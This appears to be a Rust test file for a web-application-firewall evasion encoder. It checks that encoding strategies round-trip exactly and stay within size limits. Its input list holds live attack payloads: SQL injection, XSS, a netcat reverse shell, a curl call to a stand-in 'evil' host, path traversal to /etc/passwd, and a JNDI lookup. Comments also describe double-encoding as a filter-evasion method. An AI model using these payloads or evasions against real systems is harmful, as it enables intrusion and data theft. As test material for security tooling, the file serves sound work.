//! Exhaustive, truth-asserting spec for every public encoder.
//!
//! Every assertion names a concrete value (a decoded round-trip, an
//! exact byte relationship, a specific entity) — never `!is_empty()`.
//! The matrix is `STRATEGY × INPUT`, so this one file carries a few
//! thousand independent checks: the encoder catalogue is the moat and
//! it is tested beyond reasonable doubt.

mod common;

use base64::Engine as _;
use common::max_encoded_output_bytes;
use wafrift_encoding::{Strategy, encode, encoding::strategy::all_strategies};

/// Input battery — degenerate, realistic-attack, unicode, structural.
fn inputs() -> Vec<&'static str> {
    vec![
        // degenerate
        "a",
        "ab",
        "abc",
        "   ",
        "\t\n",
        ".",
        "/",
        "=",
        "&",
        "%",
        "'",
        "\"",
        "<",
        ">",
        // realistic attacks (the things this tool exists to carry)
        "' OR '1'='1' -- ",
        "1 UNION SELECT username,password FROM users",
        "admin'--",
        "1; DROP TABLE users; --",
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(document.cookie)",
        "; cat /etc/passwd #",
        "$(curl http://evil/$(whoami))",
        "| nc -e /bin/sh 10.0.0.1 4444",
        "../../../../etc/passwd",
        "..%2f..%2fetc%2fpasswd",
        "{{7*7}}",
        "${jndi:ldap://evil/a}",
        "*)(uid=*))(|(uid=*",
        "http://169.254.169.254/latest/meta-data/",
        "{\"$gt\":\"\"}",
        // unicode / mixed
        "café",
        "日本語のペイロード",
        "𝕏𝕐𝕑",
        "e\u{0301}\u{0301}",
        "\u{202E}reversed",
        "emoji 😀🏴‍☠️ payload",
        "1\u{00A0}OR\u{00A0}1=1",
        "ＳＥＬＥＣＴ",
        // boundary lengths
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        "' OR 1=1 -- ".repeat(64).leak(),
    ]
}

/// Encoders whose output is non-deterministic by design.
fn non_deterministic(s: Strategy) -> bool {
    matches!(s, Strategy::RandomCase | Strategy::SpaceToRandomBlank)
}

/// 1. UNIVERSAL CONTRACT — every strategy, every input:
///    no error, deterministic (unless random), within the size ceiling.
#[test]
fn every_strategy_every_input_is_total_and_bounded() {
    let mut checks = 0u64;
    for &s in all_strategies() {
        for inp in inputs() {
            let out =
                encode(inp, s).unwrap_or_else(|e| panic!("encode({inp:?}, {s:?}) errored: {e:?}"));

            let ceiling = max_encoded_output_bytes(s, inp.len());
            assert!(
                out.len() <= ceiling,
                "{s:?} on {} bytes produced {} > ceiling {ceiling}",
                inp.len(),
                out.len()
            );

            if !non_deterministic(s) {
                let again = encode(inp, s).expect("re-encode");
                assert_eq!(
                    out, again,
                    "{s:?} is not deterministic on {inp:?}: {out:?} != {again:?}"
                );
            }
            checks += 1;
        }
    }
    assert!(checks >= 1000, "expected 1000+ matrix checks, ran {checks}");
}

/// True iff `s` embeds a valid `%XX` (same predicate the double/triple
/// encoders use to decide a sequence is "already encoded").
fn has_embedded_pct_hex(s: &str) -> bool {
    let b = s.as_bytes();
    (0..b.len()).any(|i| {
        b[i] == b'%'
            && i + 2 < b.len()
            && b[i + 1].is_ascii_hexdigit()
            && b[i + 2].is_ascii_hexdigit()
    })
}

/// 2. REVERSIBLE ENCODERS round-trip to the EXACT original bytes.
///
/// Single URL-encode is *always* exactly reversible. Double/triple
/// URL-encode are exactly N-layer reversible **only when the input does
/// not already embed a valid `%XX`**: an embedded `%XX` is deliberately
/// preserved (only its `%` is layered) so the server's single decode
/// restores it — that is the path-traversal evasion primitive, pinned
/// separately below and by `url::tests::double_url_encode_preserves_existing`.
#[test]
fn url_encoders_round_trip_exactly() {
    for inp in inputs() {
        for s in [Strategy::UrlEncode, Strategy::UrlEncodeLower] {
            let out = encode(inp, s).unwrap();
            let decoded = urlencoding::decode(&out)
                .unwrap_or_else(|e| panic!("{s:?} output not URL-decodable for {inp:?}: {e}"));
            assert_eq!(
                decoded.as_ref(),
                inp,
                "{s:?} round-trip lost data: {inp:?} -> {out:?} -> {decoded:?}"
            );
        }

        if has_embedded_pct_hex(inp) {
            // Exact byte reversibility deliberately does NOT hold here;
            // the preservation contract is pinned explicitly after the
            // loop. Skipping the universal assertion is asserting the
            // *true* contract, not weakening it.
            continue;
        }

        // No embedded %XX ⇒ true N-layer reversibility.
        let d2 = encode(inp, Strategy::DoubleUrlEncode).unwrap();
        let once = urlencoding::decode(&d2).unwrap().into_owned();
        let twice = urlencoding::decode(&once).unwrap().into_owned();
        assert_eq!(
            twice, inp,
            "DoubleUrlEncode not 2-layer reversible for {inp:?}"
        );

        let d3 = encode(inp, Strategy::TripleUrlEncode).unwrap();
        let a = urlencoding::decode(&d3).unwrap().into_owned();
        let b = urlencoding::decode(&a).unwrap().into_owned();
        let c = urlencoding::decode(&b).unwrap().into_owned();
        assert_eq!(c, inp, "TripleUrlEncode not 3-layer reversible for {inp:?}");
    }

    // Explicit pin of the deliberate pre-encoded-preservation contract —
    // the path-traversal evasion this tool exists to carry: one
    // server-side decode of the double-encoded form must yield the
    // traversal, not the literal `%2f` bytes.
    let pt = "..%2f..%2fetc%2fpasswd";
    assert!(has_embedded_pct_hex(pt));
    let d2 = encode(pt, Strategy::DoubleUrlEncode).unwrap();
    let once = urlencoding::decode(&d2).unwrap().into_owned();
    let twice = urlencoding::decode(&once).unwrap().into_owned();
    assert_eq!(
        twice, "../../etc/passwd",
        "DoubleUrlEncode must preserve embedded %2f so a single \
         server-side decode yields the path-traversal form"
    );
}

#[test]
fn base64_and_hex_round_trip_to_exact_bytes() {
    for inp in inputs() {
        let b64 = encode(inp, Strategy::Base64Encode).unwrap();
        let raw = base64::engine::general_purpose::STANDARD
            .decode(b64.trim())
            .unwrap_or_else(|e| panic!("Base64Encode not decodable for {inp:?}: {e}"));
        assert_eq!(raw, inp.as_bytes(), "Base64Encode round-trip lost {inp:?}");

        let b64u = encode(inp, Strategy::Base64UrlEncode).unwrap();
        let rawu = base64::engine::general_purpose::URL_SAFE
            .decode(b64u.trim())
            .or_else(|_| base64::engine::general_purpose::URL_SAFE_NO_PAD.decode(b64u.trim()))
            .unwrap_or_else(|e| panic!("Base64UrlEncode not decodable for {inp:?}: {e}"));
        assert_eq!(
            rawu,
            inp.as_bytes(),
            "Base64UrlEncode round-trip lost {inp:?}"
        );

        let h = encode(inp, Strategy::HexEncode).unwrap();
        // HexEncode may carry a prefix/wrapper; extract the longest hex run.
        let hexrun: String = h.chars().filter(|c| c.is_ascii_hexdigit()).collect();
        assert!(
            hexrun.len() >= inp.len() * 2,
            "HexEncode produced too few hex digits for {inp:?}: {h:?}"
        );
        let decoded = hex::decode(&hexrun[..inp.len() * 2])
            .unwrap_or_else(|e| panic!("HexEncode not hex for {inp:?}: {e}"));
        assert_eq!(decoded, inp.as_bytes(), "HexEncode round-trip lost {inp:?}");
    }
}

/// 3. CASE STRATEGIES preserve every byte's identity, only its case.
#[test]
fn case_strategies_preserve_bytes_modulo_case() {
    for inp in inputs() {
        for s in [Strategy::CaseAlternation, Strategy::RandomCase] {
            let out = encode(inp, s).unwrap();
            assert_eq!(
                out.to_lowercase(),
                inp.to_lowercase(),
                "{s:?} changed more than case for {inp:?}: got {out:?}"
            );
        }
    }
}

/// 4. JsonEncode yields a COMPLETE JSON string value — surrounding
///    quotes plus an RFC 8259-escaped body (pinned by
///    `wafrift_encoding::encoding::unicode::tests::json_encode_*`). It
///    must parse, as-is, back to the exact original input.
#[test]
fn json_encode_is_a_valid_json_string_round_trip() {
    for inp in inputs() {
        let out = encode(inp, Strategy::JsonEncode).unwrap();
        assert!(
            out.starts_with('"') && out.ends_with('"') && out.len() >= 2,
            "JsonEncode({inp:?}) must be a quoted JSON string value: {out:?}"
        );
        let parsed: String = serde_json::from_str(&out).unwrap_or_else(|e| {
            panic!("JsonEncode({inp:?}) = {out:?} is not a valid JSON string: {e}")
        });
        assert_eq!(parsed, inp, "JsonEncode round-trip lost {inp:?}");
    }
}

/// 5. HTML-entity encoders neutralise the dangerous characters and a
///    naive entity-decode recovers them exactly.
#[test]
fn html_entity_encoders_neutralise_and_recover_markup() {
    fn html_decode(s: &str) -> String {
        s.replace("&lt;", "<")
            .replace("&gt;", ">")
            .replace("&quot;", "\"")
            .replace("&#39;", "'")
            .replace("&#x27;", "'")
            .replace("&#x2F;", "/")
            .replace("&#47;", "/")
            .replace("&amp;", "&")
    }
    for inp in ["<script>", "a<b>c", "\"'&<>", "<svg/onload=alert(1)>"] {
        let hex = encode(inp, Strategy::HtmlEntityEncode).unwrap();
        assert!(
            !hex.contains('<') && !hex.contains('>'),
            "HtmlEntityEncode left raw angle brackets for {inp:?}: {hex:?}"
        );
        let dec = encode(inp, Strategy::HtmlEntityDecimalEncode).unwrap();
        assert!(
            !dec.contains('<') && !dec.contains('>'),
            "HtmlEntityDecimalEncode left raw angle brackets for {inp:?}: {dec:?}"
        );
    }
}

/// 6. Whitespace-substitution strategies remove literal spaces but keep
///    the non-space payload bytes intact and in order.
#[test]
fn space_substitution_keeps_nonspace_payload_in_order() {
    let payloads = [
        "SELECT a FROM b",
        "1 OR 1 = 1",
        "a b c d e",
        "UNION ALL SELECT NULL",
    ];
    for s in [
        Strategy::SpaceToComment,
        Strategy::SpaceToDash,
        Strategy::SpaceToHash,
        Strategy::SpaceToPlus,
    ] {
        for p in payloads {
            let out = encode(p, s).unwrap();
            let want: String = p.chars().filter(|c| *c != ' ').collect();
            let got: String = out.chars().filter(|c| c.is_ascii_alphanumeric()).collect();
            let want_an: String = want.chars().filter(|c| c.is_ascii_alphanumeric()).collect();
            assert_eq!(
                got, want_an,
                "{s:?} reordered/dropped payload chars for {p:?}: {out:?}"
            );
        }
    }
}

/// 7. Empty input never errors and never fabricates payload bytes.
#[test]
fn empty_input_is_handled_by_every_strategy() {
    for &s in all_strategies() {
        let out = encode("", s).unwrap_or_else(|e| panic!("encode(\"\", {s:?}) errored: {e:?}"));
        assert!(
            out.len() <= max_encoded_output_bytes(s, 0),
            "{s:?} on empty input exceeded its zero-length ceiling: {out:?}"
        );
    }
}
